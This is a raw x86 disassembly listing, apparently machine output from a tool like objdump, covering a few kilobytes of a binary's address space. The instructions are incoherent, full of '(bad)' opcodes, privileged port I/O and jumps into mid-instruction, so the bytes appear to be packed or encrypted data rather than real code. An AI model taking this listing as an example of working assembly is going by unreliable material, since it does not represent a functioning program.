  405ddd:	fcomp  DWORD PTR [eax+edx*1]
  405de0:	push   ebx
  405de1:	xchg   ecx,eax
  405de2:	out    dx,eax
  405de3:	adc    eax,0x4131aa0a
  405de8:	inc    esi
  405de9:	out    0x54,al
  405deb:	out    dx,al
  405dec:	and    DWORD PTR [eax-0x61],0xf
  405df0:	inc    esp
  405df1:	shl    BYTE PTR [di+0x19],1
  405df5:	das    
  405df6:	out    dx,al
  405df7:	add    DWORD PTR [ebx-0x66],esp
  405dfa:	sti    
  405dfb:	inc    esi
  405dfc:	lods   eax,DWORD PTR ds:[esi]
  405dfd:	shl    esp,cl
  405dff:	mov    al,ds:0xfc55c5ee
  405e04:	mov    al,0x6d
  405e06:	sbb    BYTE PTR [ebx+0x5e],dh
  405e09:	add    al,0xf3
  405e0b:	or     ebx,eax
  405e0d:	pop    ebx
  405e0e:	mov    ch,0xdf
  405e10:	jb     0x405e72
  405e12:	rcl    dh,cl
  405e14:	sub    cl,BYTE PTR [ebx-0x69]
  405e17:	fstp   TBYTE PTR [ebp-0x2cbc110b]
  405e1d:	and    DWORD PTR [ebx+eiz*1-0x1b],edi
  405e21:	push   es
  405e22:	adc    esp,DWORD PTR [ecx+0x9467445]
  405e28:	add    BYTE PTR [edx-0x609a76fb],dh
  405e2e:	or     eax,0xd5e0dbe9
  405e33:	lock in al,0x1d
  405e36:	les    esp,FWORD PTR [eax+0x32af08e8]
  405e3c:	dec    DWORD PTR [eax+0x75]
  405e3f:	sahf   
  405e40:	pop    esi
  405e41:	ret    0x99ac
  405e44:	mov    ebx,0x86388c31
  405e49:	pusha  
  405e4a:	mov    cl,al
  405e4c:	pop    ecx
  405e4d:	pop    ebx
  405e4e:	(bad)  
  405e4f:	sti    
  405e50:	xchg   esp,eax
  405e51:	ja     0x405e72
  405e53:	(bad)  
  405e54:	in     al,dx
  405e55:	int3   
  405e56:	out    dx,eax
  405e57:	and    ecx,eax
  405e59:	bound  ebx,QWORD PTR [ecx-0x69]
  405e5c:	adc    BYTE PTR [esi-0x2c519512],dl
  405e62:	ss iret 
  405e64:	pop    edx
  405e65:	popa   
  405e66:	stos   DWORD PTR es:[edi],eax
  405e67:	fisttp WORD PTR [edi]
  405e69:	xlat   BYTE PTR ds:[ebx]
  405e6a:	mov    DWORD PTR [ecx-0x5b],ecx
  405e6d:	sub    ah,bh
  405e6f:	shr    BYTE PTR [esi-0x7b],1
  405e72:	push   ds
  405e73:	xlat   BYTE PTR ds:[ebx]
  405e74:	ds mov esi,0xb32a9739
  405e7a:	push   edi
  405e7b:	mov    eax,ds:0x52913c08
  405e80:	sbb    eax,0x5e2049ea
  405e85:	(bad)  
  405e87:	pop    edx
  405e88:	inc    edx
  405e89:	sbb    ebp,DWORD PTR [eax+0x67]
  405e8c:	aaa    
  405e8d:	and    eax,0xf1f2a3cf
  405e92:	pop    esp
  405e93:	shl    DWORD PTR [edi+0x25],1
  405e96:	xchg   esi,eax
  405e97:	test   DWORD PTR [esp+ebx*1+0x2],ebx
  405e9b:	les    ecx,FWORD PTR [esi-0x61]
  405e9e:	scas   eax,DWORD PTR es:[edi]
  405e9f:	pusha  
  405ea0:	shr    DWORD PTR es:[edx],0x25
  405ea4:	sbb    al,0xfd
  405ea6:	mov    ecx,0x33c0f8d
  405eab:	ins    DWORD PTR es:[edi],dx
  405eac:	pop    ebp
  405ead:	mov    WORD PTR [edx*4+0x6d644bcd],fs
  405eb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405eb5:	add    ebx,esi
  405eb7:	les    ebx,FWORD PTR ds:0x72a0c29a
  405ebd:	sub    DWORD PTR [edi],edx
  405ebf:	pop    eax
  405ec0:	dec    esi
  405ec1:	pusha  
  405ec2:	or     BYTE PTR [ebp+eiz*1+0x71],bl
  405ec6:	cmp    bl,BYTE PTR [edx-0x14814773]
  405ecc:	push   ecx
  405ecd:	mov    esi,0x30a32fa6
  405ed2:	aas    
  405ed3:	popa   
  405ed4:	ss cld 
  405ed6:	jg     0x405f20
  405ed8:	les    esp,FWORD PTR [eax-0x78]
  405edb:	mov    cl,0x56
  405edd:	ss out 0x32,al
  405ee0:	icebp  
  405ee1:	aad    0xec
  405ee3:	or     eax,0xf5f43a2d
  405ee8:	adc    BYTE PTR [ecx+0x533c3e27],ah
  405eee:	pusha  
  405eef:	cmp    cl,BYTE PTR ds:0x184ace53
  405ef5:	mov    BYTE PTR [edi],cl
  405ef7:	pop    bx
  405ef9:	fcom   DWORD PTR [eax]
  405efb:	cmp    al,0xf2
  405efd:	or     DWORD PTR [esi+0x77],ebx
  405f00:	call   0xd2e1e532
  405f05:	ja     0x405eaf
  405f07:	jae    0x405f05
  405f09:	dec    eax
  405f0a:	pop    ecx
  405f0b:	jo     0x405f6b
  405f0d:	(bad)  
  405f0f:	jg     0x405f90
  405f11:	jae    0x405f06
  405f13:	inc    ebx
  405f14:	mul    DWORD PTR [eax-0x1a]
  405f17:	jno    0x405e99
  405f19:	ja     0x405f6f
  405f1b:	aas    
  405f1c:	lahf   
  405f1d:	je     0x405f0d
  405f1f:	aaa    
  405f20:	aaa    
  405f21:	rcr    DWORD PTR [ebx+0x2f14dd47],cl
  405f27:	mov    eax,ds:0xb35253f0
  405f2c:	sbb    eax,0x5ef59840
  405f31:	mov    al,0xa1
  405f33:	pushf  
  405f34:	cmp    ch,BYTE PTR [esi]
  405f36:	or     al,0xf2
  405f38:	and    ebx,DWORD PTR [edi+eiz*2+0x55]
  405f3c:	mov    cx,0xa08e
  405f40:	(bad)  
  405f41:	fmul   DWORD PTR [esi]
  405f43:	add    al,0x9f
  405f45:	and    edx,ebp
  405f47:	mov    bl,BYTE PTR [ebp+0x6d]
  405f4a:	mov    dl,0x3a
  405f4c:	jns    0x405f8a
  405f4e:	std    
  405f4f:	inc    ebp
  405f50:	mov    ds:0x65a0a991,al
  405f55:	sbb    eax,0x5e3ed231
  405f5a:	(bad)  
  405f5b:	mov    ebp,0x9cee1af3
  405f60:	ja     0x405f46
  405f62:	xor    bl,0xc8
  405f65:	jns    0x405f22
  405f67:	mov    al,ds:0x3ebc14a4
  405f6c:	add    al,0x2d
  405f6e:	inc    esp
  405f6f:	or     al,0x5e
  405f71:	push   edi
  405f72:	adc    al,0xac
  405f74:	pop    ebp
  405f75:	rcr    esp,1
  405f77:	sub    ebp,ecx
  405f79:	pusha  
  405f7a:	ins    DWORD PTR es:[edi],dx
  405f7b:	gs pop ecx
  405f7d:	dec    edi
  405f7e:	or     BYTE PTR [edi+0x28],0x5
  405f82:	out    dx,al
  405f83:	xor    DWORD PTR [ebx+0x43],esi
  405f86:	dec    ebx
  405f87:	lea    eax,[ecx+0x79a1a1e5]
  405f8d:	scas   eax,DWORD PTR es:[edi]
  405f8e:	xchg   DWORD PTR ds:0xa2271778,eax
  405f94:	pop    esi
  405f95:	push   0x7b
  405f97:	mov    ebx,DWORD PTR [edx]
  405f99:	push   cs
  405f9a:	jg     0x406006
  405f9c:	add    DWORD PTR [edi+0x1d],ebx
  405f9f:	sub    edx,DWORD PTR [eax]
  405fa1:	or     al,0x4a
  405fa3:	outs   dx,BYTE PTR ds:[esi]
  405fa4:	jg     0x405f2a
  405fa6:	jbe    0x405fc3
  405fa8:	xor    eax,0x4fc5ff41
  405fad:	les    ebp,FWORD PTR [esi+0x21e8fc9e]
  405fb3:	pop    esp
  405fb4:	push   esp
  405fb5:	popa   
  405fb6:	stos   BYTE PTR es:[edi],al
  405fb7:	test   al,0x2a
  405fb9:	stos   BYTE PTR es:[edi],al
  405fba:	xor    eax,0x4cb291a6
  405fbf:	push   ds
  405fc0:	jg     0x405f66
  405fc2:	sub    DWORD PTR [edi+0x4d60fa6e],edx
  405fc8:	pop    edi
  405fc9:	and    al,0x65
  405fcb:	loop   0x405f5b
  405fcd:	retf   0x68e4
  405fd0:	inc    eax
  405fd1:	jne    0x405fc9
  405fd3:	mov    al,ds:0x4b934600
  405fd8:	fwait
  405fd9:	adc    ch,BYTE PTR [eax]
  405fdb:	adc    BYTE PTR [esi-0x712b116f],al
  405fe1:	cmp    esp,esi
  405fe3:	mov    bh,0xe0
  405fe5:	pop    ds
  405fe6:	push   0x6ee1c7aa
  405feb:	(bad)  
  405fec:	enter  0x1b24,0x80
  405ff0:	dec    eax
  405ff1:	sub    dh,ch
  405ff3:	pop    edx
  405ff4:	add    ah,BYTE PTR [ebp-0x77b0813]
  405ffa:	jmp    0x405f9c
  405ffc:	in     al,dx
  405ffd:	xchg   dl,al
  405fff:	bts    DWORD PTR [eax-0x19],eax
  406003:	imul   ebx,DWORD PTR [esi-0x4e],0x4de8afdc
  40600a:	cmp    al,0x5a
  40600c:	test   al,0x40
  40600e:	xor    al,BYTE PTR [ebx+0x2b7ff6d8]
  406014:	pop    edx
  406015:	in     al,0xea
  406017:	sbb    eax,0xc42b2517
  40601c:	adc    al,0xd9
  40601e:	push   edx
  40601f:	mov    ebp,DWORD PTR ds:0xb71ef661
  406025:	lea    esp,[eax-0x12bdd75e]
  40602b:	cld    
  40602c:	aam    0xec
  40602e:	bound  edi,QWORD PTR [ebx-0x80]
  406031:	call   0x77f8:0x5d841556
  406038:	xchg   DWORD PTR [eax-0x615117fb],ecx
  40603e:	ins    DWORD PTR es:[edi],dx
  40603f:	pop    es
  406040:	xor    ah,BYTE PTR [ebx-0x34]
  406043:	and    DWORD PTR [esi],edi
  406045:	(bad)  
  406046:	sar    cl,cl
  406048:	loope  0x4060c9
  40604a:	xor    eax,0x8410ded2
  40604f:	cmp    al,0x6f
  406051:	popa   
  406052:	or     DWORD PTR [eax],esi
  406054:	pop    esi
  406055:	push   ecx
  406056:	cmp    ch,BYTE PTR [edi-0x47]
  406059:	sbb    edx,DWORD PTR [ebx]
  40605b:	jns    0x40603b
  40605d:	pusha  
  40605e:	pop    edx
  40605f:	sti    
  406060:	or     eax,0x119c368e
  406065:	sub    al,0xee
  406067:	lds    edi,FWORD PTR [esp+edx*8-0x11bcce2f]
  40606e:	(bad)  
  40606f:	mov    al,ds:0x21ab622d
  406074:	outs   dx,DWORD PTR ds:[esi]
  406075:	daa    
  406076:	jg     0x406059
  406078:	pop    esi
  406079:	sbb    bl,BYTE PTR [edx+edi*2-0x68eac480]
  406080:	push   0x9c87885a
  406085:	mov    ds:0x147ef0e6,al
  40608a:	add    DWORD PTR ds:0x3cec9652,ecx
  406090:	fidiv  WORD PTR [esp+ecx*8+0x58a4cd1b]
  406097:	mov    eax,ds:0x4329f63d
  40609c:	or     ebx,edi
  40609e:	xchg   BYTE PTR [eax-0x733a49a2],ah
  4060a4:	and    ch,ah
  4060a6:	adc    eax,0xb60aa83
  4060ab:	xor    BYTE PTR [edx-0x37652d4],bh
  4060b1:	shr    dh,1
  4060b3:	test   BYTE PTR [edi+0x2038774a],0xa3
  4060ba:	pop    fs
  4060bc:	jmp    0x40612a
  4060be:	je     0x4060ca
  4060c0:	lahf   
  4060c1:	push   cs
  4060c2:	sar    al,0x5e
  4060c5:	mov    bl,0x39
  4060c7:	pushf  
  4060c8:	sub    BYTE PTR [ecx-0x41],al
  4060cb:	retf   
  4060cc:	in     al,0x5d
  4060ce:	xchg   esp,eax
  4060cf:	popf   
  4060d0:	(bad)  [ecx+0x62]
  4060d3:	or     esi,esp
  4060d5:	or     eax,0xe35e2307
  4060da:	mov    BYTE PTR [esi+esi*1],ah
  4060dd:	adc    DWORD PTR [edi+0x3f606c99],ebx
  4060e3:	(bad)  
  4060e4:	jp     0x4060a7
  4060e6:	mov    cl,0x39
  4060e8:	or     bh,BYTE PTR [esi-0x12]
  4060eb:	call   0x7c9a3d0d
  4060f0:	shr    BYTE PTR [ecx+ecx*4+0x4a92f0a1],1
  4060f7:	je     0x406166
  4060f9:	aas    
  4060fa:	jecxz  0x4060eb
  4060fc:	pop    esi
  4060fd:	add    esp,DWORD PTR [eax]
  4060ff:	adc    eax,0x9d9e8f7d
  406104:	mov    BYTE PTR [eax-0x3],ah
  406107:	mov    ebx,0xa3491d22
  40610c:	mov    edi,0xa3a22427
  406111:	pusha  
  406112:	fst    DWORD PTR [edx]
  406114:	push   esi
  406115:	sub    esp,DWORD PTR [esi+0x5160ed23]
  40611b:	mov    edi,0x3ef0dfa6
  406120:	sbb    ah,BYTE PTR [ebp+0x10fa7ee]
  406126:	inc    eax
  406127:	dec    edi
  406128:	xor    DWORD PTR [ecx-0x53],esi
  40612b:	mov    al,ds:0x33cdefa
  406130:	push   edx
  406131:	dec    edx
  406132:	add    al,0xe1
  406134:	lock leave 
  406136:	cli    
  406137:	popa   
  406138:	or     ebp,DWORD PTR [edx+0x74]
  40613b:	stos   DWORD PTR es:[edi],eax
  40613c:	je     0x40619e
  40613e:	push   es
  40613f:	mov    ah,0x5c
  406141:	lods   eax,DWORD PTR ds:[esi]
  406142:	cs arpl cx,sp
  406145:	pop    ebx
  406146:	ins    BYTE PTR es:[edi],dx
  406147:	inc    edx
  406148:	sbb    DWORD PTR [ecx+ebp*8-0x5dae00a0],ebx
  40614f:	js     0x4061aa
  406151:	(bad)  
  406152:	push   esi
  406153:	inc    edi
  406154:	nop
  406155:	out    dx,eax
  406156:	cs jl  0x40616e
  406159:	call   0x48b:0xd861a0f7
  406160:	outs   dx,DWORD PTR ds:[esi]
  406161:	mov    ds:0x5360e83b,eax
  406166:	pushf  
  406167:	or     DWORD PTR [eax-0x79],ebp
  40616a:	call   0x91196ff2
  40616f:	sub    eax,0x204060bd
  406174:	jl     0x406193
  406176:	jle    0x40619b
  406178:	jnp    0x4061a8
  40617a:	out    dx,al
  40617b:	add    edi,DWORD PTR ds:0x9c4ae448
  406181:	mov    al,ds:0x7378a194
  406186:	(bad)  
  406187:	add    ch,BYTE PTR [eax+0x5b9bc3d6]
  40618d:	addr16 ds aas 
  406190:	adc    BYTE PTR [eax],dh
  406192:	fnstsw WORD PTR [ebp+0x1]
  406195:	push   ebp
  406196:	push   cs
  406197:	outs   dx,BYTE PTR ds:[esi]
  406198:	neg    DWORD PTR [ecx+0x42]
  40619b:	loop   0x40612a
  40619d:	mov    ds:0xd515e0d4,eax
  4061a2:	pop    ebp
  4061a3:	push   ebp
  4061a4:	pop    edi
  4061a5:	out    dx,al
  4061a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4061a7:	popf   
  4061a8:	push   ss
  4061a9:	cmp    al,0x6f
  4061ab:	ins    BYTE PTR es:[edi],dx
  4061ac:	xchg   DWORD PTR [eax+0x60c845ae],ebp
  4061b2:	bound  edx,QWORD PTR [edi+0x7b]
  4061b5:	pop    ss
  4061b6:	push   edx
  4061b7:	fstp   DWORD PTR [edi+0xb]
  4061ba:	out    dx,al
  4061bb:	dec    eax
  4061bc:	sbb    al,0xaf
  4061be:	ja     0x406223
  4061c0:	imul   ebp,DWORD PTR [ebx*4+0xde5baa1],0x841dcfda
  4061cb:	data16 cmp al,cl
  4061ce:	cwde   
  4061cf:	dec    eax
  4061d0:	cmp    dh,BYTE PTR [ebp-0x66588112]
  4061d6:	call   0x25a15398
  4061db:	dec    eax
  4061dc:	mov    ds:0x8d892829,al
  4061e1:	push   eax
  4061e2:	out    dx,al
  4061e3:	popa   
  4061e4:	sub    al,0xdd
  4061e6:	ss mov bl,0xbf
  4061e9:	push   ecx
  4061ea:	pop    edx
  4061eb:	mov    eax,ds:0x17990f01
  4061f0:	sbb    DWORD PTR [edx+eax*2+0xecc5ee8],edi
  4061f7:	out    0xc3,eax
  4061f9:	cli    
  4061fa:	lahf   
  4061fb:	cli    
  4061fc:	retf   
  4061fd:	pop    esi
  4061fe:	fcomp  DWORD PTR [esi+0x52]
  406201:	fwait
  406202:	add    BYTE PTR [ebx+0x1e],ch
  406205:	fsub   QWORD PTR [eax+ebp*1-0x220e40a3]
  40620c:	pop    edx
  40620d:	push   ss
  40620e:	cmp    bh,BYTE PTR [ecx-0x5f32c292]
  406214:	push   ss
  406215:	dec    edi
  406216:	cmp    DWORD PTR [esi+ebp*1+0x5e93cea8],esi
  40621d:	mov    BYTE PTR [ecx+ebx*1+0x6c96001f],ah
  406224:	or     bl,BYTE PTR [ebp-0x25]
  406227:	fmul   DWORD PTR [ebp+0x60689990]
  40622d:	jp     0x4061d4
  40622f:	jno    0x40620a
  406231:	xor    eax,DWORD PTR [eax+0x7d55db9]
  406237:	les    ebx,FWORD PTR cs:[ebx-0x7d]
  40623b:	lea    edi,[edx-0x33]
  40623e:	and    al,0xa1
  406240:	ss sub edi,eax
  406243:	out    dx,al
  406244:	push   eax
  406245:	sub    DWORD PTR [ecx-0x58a17c],0x52
  40624c:	(bad)  
  40624d:	fisttp DWORD PTR [eax+0x5c]
  406250:	aad    0x65
  406252:	stos   DWORD PTR es:[edi],eax
  406253:	cmc    
  406254:	fdivp  st(0),st
  406256:	(bad)  
  406257:	(bad)  
  406258:	mov    WORD PTR cs:[eax+0x13],es
  40625c:	pop    esi
  40625d:	hlt    
  40625e:	dec    edx
  40625f:	(bad)  
  406260:	fidiv  WORD PTR [eax]
  406262:	and    eax,0xd35f7530
  406267:	add    al,BYTE PTR [esi]
  406269:	retf   
  40626a:	sti    
  40626b:	dec    ebp
  40626c:	pop    ss
  40626d:	or     DWORD PTR [edx+0x2b035e3c],0x190d561e
  406277:	and    DWORD PTR [edx+0x58],eax
  40627a:	xchg   esi,eax
  40627b:	mov    bh,0x62
  40627d:	outs   dx,BYTE PTR ds:[esi]
  40627f:	pushf  
  406280:	xchg   ecx,eax
  406281:	jo     0x406279
  406283:	sbb    DWORD PTR [edi+eax*2-0x57],edx
  406287:	in     eax,dx
  406288:	sahf   
  406289:	pop    ecx
  40628a:	xchg   ebx,eax
  40628b:	push   ebp
  40628c:	fisttp WORD PTR ds:0x8f1da0c8
  406292:	sbb    DWORD PTR [esi-0x40842351],0x44
  406299:	sbb    DWORD PTR fs:[edx+0x11e8095e],ebx
  4062a0:	in     eax,0x7e
  4062a2:	push   0x4cc5a3a1
  4062a7:	cmp    bl,BYTE PTR [edi+0x5c]
  4062aa:	int3   
  4062ab:	arpl   WORD PTR [esi-0x65],bx
  4062ae:	js     0x40628b
  4062b0:	fcom   DWORD PTR ds:0x60ac4316
  4062b6:	inc    eax
  4062b7:	cmp    al,0x82
  4062b9:	mov    bh,0xfe
  4062bb:	mov    ch,BYTE PTR [esi-0x422a11bb]
  4062c1:	rcr    DWORD PTR [ecx],1
  4062c3:	add    al,0xd6
  4062c5:	fscale 
  4062c7:	mov    al,ds:0x2a82a615
  4062cc:	push   0xffffffae
  4062ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4062cf:	ret    0x285a
  4062d2:	push   ebp
  4062d3:	xor    ebx,DWORD PTR [ecx]
  4062d5:	imul   DWORD PTR [esi]
  4062d7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4062d8:	aam    0xb5
  4062da:	scas   eax,DWORD PTR es:[edi]
  4062db:	mov    al,ds:0x9482d505
  4062e0:	mov    ecx,0x5efc43be
  4062e5:	rol    DWORD PTR [ecx],0xf8
  4062e8:	mov    dh,0x6e
  4062ea:	fld    QWORD PTR [ebx-0x1a]
  4062ed:	pusha  
  4062ee:	mov    eax,ds:0xf6f228c1
  4062f3:	(bad)  
  4062f4:	and    esp,ebx
  4062f6:	out    dx,al
  4062f7:	test   DWORD PTR [edi],ecx
  4062f9:	call   0xa098:0x6809b9f3
  406300:	rcr    BYTE PTR [ebx],cl
  406302:	mov    bl,0x9c
  406304:	shl    BYTE PTR [eax+0x35],1
  406307:	xchg   ebx,eax
  406308:	dec    ebx
  406309:	mov    ebx,DWORD PTR [ebp-0x4258a4d0]
  40630f:	enter  0xc924,0x37
  406313:	add    al,0x1e
  406315:	and    al,0xde
  406317:	dec    esi
  406318:	cmp    ah,BYTE PTR [ecx-0x7f]
  40631b:	daa    
  40631c:	outs   dx,DWORD PTR ds:[esi]
  40631d:	or     DWORD PTR ss:[ebp+eiz*1-0x6d36df78],esi
  406325:	pusha  
  406326:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406327:	das    
  406328:	xchg   esi,eax
  406329:	cld    
  40632a:	cmp    DWORD PTR ds:0x7de0609f,0x5b
  406331:	adc    dl,0x32
  406334:	ins    BYTE PTR es:[edi],dx
  406335:	call   0xfeee:0x24ae3752
  40633c:	ret    
  40633d:	and    ebx,DWORD PTR ds:0x41c056a9
  406343:	jnp    0x40632a
  406345:	pusha  
  406346:	fwait
  406347:	js     0x4063c0
  406349:	mov    DWORD PTR [ebp+0x1f5d402],esi
  40634f:	bound  edi,QWORD PTR [edi]
  406351:	stos   DWORD PTR es:[edi],eax
  406352:	out    dx,al
  406353:	cmp    al,0xd8
  406355:	out    0xbd,al
  406357:	js     0x406355
  406359:	pusha  
  40635a:	jns    0x4063db
  40635c:	jmp    0x406328
  40635e:	mov    edi,0xb2310eec
  406363:	(bad)  
  406364:	fbld   TBYTE PTR [eax+0x16]
  406367:	nop
  406368:	cmp    eax,eax
  40636a:	shr    BYTE PTR [ebx],cl
  40636c:	test   BYTE PTR [eax-0x71],al
  40636f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406370:	enter  0x3b8b,0xcf
  406374:	pop    esi
  406375:	inc    BYTE PTR [edx-0x2c6d5228]
  40637b:	lock nop
  40637d:	push   edx
  40637e:	es jb  0x4063d4
  406381:	ror    DWORD PTR [esi+0x6752f93b],cl
  406387:	push   cs
  406388:	(bad)  
  406389:	cwde   
  40638a:	jecxz  0x4063f8
  40638c:	pop    esi
  40638d:	xchg   DWORD PTR [ecx-0x2f],eax
  406390:	mov    al,ds:0x2e728288
  406395:	popa   
  406396:	and    eax,0x34aa02e8
  40639b:	mov    ebx,0x50ed165b
  4063a0:	fs mov ah,0xd5
  4063a3:	push   edx
  4063a4:	repnz xchg edx,eax
  4063a6:	fisubr WORD PTR [ebx-0x2f079f91]
  4063ac:	lahf   
  4063ad:	sbb    BYTE PTR [edx+eax*1-0x36],bh
  4063b1:	out    0xe7,eax
  4063b3:	out    dx,al
  4063b4:	fist   WORD PTR [esi-0x355f4af7]
  4063ba:	push   edx
  4063bb:	sbb    DWORD PTR [ebx],0xbba106e4
  4063c1:	dec    edx
  4063c2:	or     BYTE PTR [edx-0x59],0xab
  4063c6:	xchg   esi,eax
  4063c7:	jg     0x406405
  4063c9:	lods   eax,DWORD PTR ds:[esi]
  4063ca:	push   edi
  4063cb:	adc    bl,BYTE PTR [esi-0x3c]
  4063ce:	jae    0x406370
  4063d0:	mov    edx,DWORD PTR [ebx+0x3988a108]
  4063d6:	or     al,0x4c
  4063d8:	pop    ebx
  4063d9:	mov    ds:0xc64f8fb,al
  4063de:	add    ebx,esp
  4063e0:	js     0x4063bf
  4063e2:	add    BYTE PTR [edi-0x74c146b2],dl
  4063e8:	icebp  
  4063e9:	inc    edx
  4063ea:	fstp   st(2)
  4063ec:	mov    edx,0x3f420760
  4063f1:	fstp   DWORD PTR [ebx]
  4063f3:	mov    dl,0x70
  4063f5:	push   edx
  4063f6:	out    dx,al
  4063f7:	add    bl,BYTE PTR [eax+0x539cd966]
  4063fd:	pop    ebp
  4063fe:	mov    al,0x8
  406400:	add    al,0x1
  406402:	into   
  406403:	inc    DWORD PTR [eax+eiz*2-0x4229ef49]
  40640a:	ja     0x40647d
  40640c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40640d:	fsub   QWORD PTR ds:0xaae08d6d
  406413:	adc    al,0xa
  406415:	xor    BYTE PTR [ebp+0x52b802c5],ah
  40641b:	fs cdq 
  40641d:	pusha  
  40641e:	jnp    0x406475
  406420:	int3   
  406421:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406422:	cmp    eax,DWORD PTR [edi-0x4625446c]
  406428:	pop    esi
  406429:	sti    
  40642a:	xor    eax,0xdfc166f6
  40642f:	fcom   QWORD PTR [ebx-0x7ca00ea0]
  406435:	inc    esp
  406436:	jns    0x406476
  406438:	adc    DWORD PTR [edi+eiz*8+0x5b],ebp
  40643c:	clc    
  40643d:	push   0xffffff94
  40643f:	inc    ebx
  406440:	invd   
  406442:	outs   dx,BYTE PTR ds:[esi]
  406443:	push   ecx
  406444:	jl     0x40649a
  406446:	xor    BYTE PTR [eax-0x5ea1d06f],bl
  40644c:	mov    ch,0xc7
  40644e:	push   edx
  40644f:	or     DWORD PTR [esp+edx*1+0x610d6726],0xc4ad14d9
  40645a:	fist   WORD PTR [eax-0x6b]
  40645d:	mov    al,ds:0xe91938e2
  406462:	push   0x75bb5d0a
  406467:	das    
  406468:	xor    BYTE PTR [ecx+edi*1+0x25],0x7f
  40646d:	test   DWORD PTR [ebx+0x61],ecx
  406470:	lods   eax,DWORD PTR ds:[esi]
  406471:	jbe    0xfd050918
  406477:	bound  esi,QWORD PTR [esi+eiz*4]
  40647a:	jbe    0x406432
  40647c:	pop    esi
  40647d:	xchg   BYTE PTR [esi-0x11],bh
  406480:	xor    eax,0x8bad1218
  406485:	dec    edx
  406486:	or     eax,0xe26131e7
  40648b:	add    eax,0xfba7dfff
  406490:	pop    esi
  406491:	jg     0x4064f5
  406493:	fidiv  WORD PTR [ebp-0x14d92f73]
  406499:	popa   
  40649a:	and    DWORD PTR [esi+eiz*4],ebp
  40649d:	cdq    
  40649e:	out    dx,al
  40649f:	popf   
  4064a0:	out    0x1a,eax
  4064a2:	cwde   
  4064a3:	je     0x406483
  4064a5:	cdq    
  4064a6:	(bad)  
  4064a8:	cmp    BYTE PTR [edx-0x76],dl
  4064ab:	and    al,0x8f
  4064ad:	aaa    
  4064ae:	sub    DWORD PTR [eax-0x70cd2e9e],esi
  4064b4:	shl    BYTE PTR [eax+0x6a],cl
  4064b7:	push   ss
  4064b8:	in     al,dx
  4064b9:	ins    DWORD PTR es:[edi],dx
  4064ba:	mov    ebp,0xee7566ef
  4064bf:	hlt    
  4064c0:	xor    DWORD PTR [ecx+0x77],eax
  4064c3:	out    0x60,eax
  4064c5:	in     al,dx
  4064c6:	sub    WORD PTR [ebx],bp
  4064c9:	popa   
  4064ca:	push   ebp
  4064cb:	push   ss
  4064cc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4064cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4064ce:	call   0x6136c21c
  4064d3:	push   ebp
  4064d4:	push   ebx
  4064d5:	mov    al,ds:0x969ef09f
  4064da:	add    bh,BYTE PTR [edx+0x3c]
  4064dd:	sub    eax,0x384eccff
  4064e2:	out    dx,al
  4064e3:	dec    ebx
  4064e4:	sbb    edi,ecx
  4064e6:	fiadd  WORD PTR es:[esi+ecx*4-0x10]
  4064eb:	ins    BYTE PTR es:[edi],dx
  4064ec:	loop   0x40647c
  4064ee:	push   es
  4064ef:	and    al,0xc3
  4064f1:	jae    0x406516
  4064f3:	mov    eax,ds:0xce1ea76e
  4064f8:	pop    es
  4064f9:	push   edi
  4064fa:	out    0x16,eax
  4064fc:	in     al,dx
  4064fd:	fucomi st,st(6)
  4064ff:	add    BYTE PTR [edx+0x3937d8a0],dl
  406505:	push   esp
  406506:	mov    ebp,0x3a9a45a0
  40650b:	sub    al,0x7b
  40650d:	div    edx
  40650f:	sub    bl,BYTE PTR [esi-0x6f]
  406512:	push   ebp
  406513:	mov    edi,0x2a692449
  406518:	dec    esi
  406519:	popa   
  40651a:	mov    eax,ds:0xb1f5de5b
  40651f:	daa    
  406520:	retf   
  406521:	xor    esi,ebp
  406523:	ins    BYTE PTR es:[edi],dx
  406524:	int3   
  406525:	jg     0x40654f
  406527:	sbb    ecx,DWORD PTR [edi]
  406529:	rcl    DWORD PTR [esi],1
  40652b:	mov    eax,ds:0x1de3b177
  406530:	es (bad) 
  406532:	sub    al,0xd3
  406534:	pop    esi
  406535:	in     eax,dx
  406536:	(bad)  
  406537:	push   esp
  406538:	push   0x9fdb06ef
  40653d:	pusha  
  40653e:	dec    ebx
  40653f:	ja     0x406518
  406541:	int    0xd0
  406543:	out    0x5a,eax
  406545:	gs pop esi
  406547:	or     BYTE PTR [ebx],dh
  406549:	(bad)  
  40654b:	mov    al,ds:0x8802e441
  406550:	lods   eax,DWORD PTR ds:[esi]
  406551:	jmp    0x406594
  406553:	mov    eax,ds:0x2d8ad7b8
  406558:	mov    ebp,gs
  40655a:	int3   
  40655b:	ins    BYTE PTR es:[edi],dx
  40655c:	pop    ebx
  40655d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40655e:	aas    
  40655f:	test   eax,ebp
  406561:	loope  0x4064e8
  406563:	mov    eax,ds:0xf24b0b35
  406568:	sbb    eax,DWORD PTR [edx]
  40656a:	jae    0x40650d
  40656c:	pop    esp
  40656d:	push   cs
  40656e:	push   esi
  40656f:	test   al,0xfc
  406571:	sbb    al,0xee
  406573:	nop
  406574:	mov    bh,0xdf
  406576:	fadd   QWORD PTR [eax+ebp*1]
  406579:	rcr    BYTE PTR [ebx-0x5f],cl
  40657c:	clc    
  40657d:	and    BYTE PTR [edi+edi*4+0x479ea805],bl
  406584:	out    dx,eax
  406585:	vcvtss2sd xmm2,xmm2,xmm1
  406589:	xchg   dl,ch
  40658b:	dec    ebx
  40658c:	push   esp
  40658d:	out    dx,al
  40658e:	xor    eax,0xca56aca1
  406593:	mov    esp,DWORD PTR [ebx-0x3f734cee]
  406599:	test   al,0xce
  40659b:	cmc    
  40659c:	add    ch,al
  40659e:	out    dx,al
  40659f:	adc    dl,BYTE PTR [ecx]
  4065a1:	add    BYTE PTR [ebx-0x44],dl
  4065a4:	mov    dl,0x57
  4065a6:	fldenv [eax-0x78cfc9f3]
  4065ac:	mov    bh,0x46
  4065ae:	mov    al,ds:0xfb6c4f89
  4065b3:	adc    ebx,DWORD PTR [esi-0x4a]
  4065b6:	stc    
